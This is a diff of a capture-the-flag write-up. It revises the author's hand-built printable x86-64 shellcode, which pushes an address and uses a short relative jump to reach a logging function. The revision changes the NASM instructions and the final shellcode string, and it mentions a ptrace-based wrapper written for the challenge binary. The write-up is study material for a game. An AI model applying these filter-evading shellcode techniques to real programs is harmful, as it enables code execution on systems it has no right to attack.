@@ -299,30 +299,23 @@ push   rsp
 pop    rdx
 pop    rax
 push   0x41414152
-xor    rdi,  QWORD PTR ss:[rdx]
-pop    r8
+xor    rdi, QWORD PTR ss:[rdx]
 ```
 
 Next, we'd like to jump to `hw_log` somehow. Unfortunately, this is not easy as most of the jump instructions are not printable. However, some of the relative short jumps are printable. We could push the address we'd like to jump to, then use a relative short jump to jump down to the return at the end of the function.
 
 With some trial and error, this is what I came up with:
 ```nasm
-push   rsp
-pop    rdx
-pop    rax
-push   0x41414152
-xor    rdi,  QWORD PTR ss:[rdx]
-pop    r8
 push   0x41614141
 pop    rax
-xor    eax,  0x41214c3a
+xor    eax, 0x41214c32
 push   rax
 jne    0x40043d
 ```
 
-The final shellcode (without the quotes, note the space):
+The final shellcode:
 ```
-'TZXhRAAA6H3:AXhAAaAX5:L!APu '
+TZXhRAAA6H3:hAAaAX52L!APu"
 ```
 
 Since the organizers decided to release the binary later, I wrote a custom wrapper (mostly implemented with `ptrace`) to patch the output strings to proper ANSI, provide the custom syscalls, and trigger LiveSplit on some checkpoints.
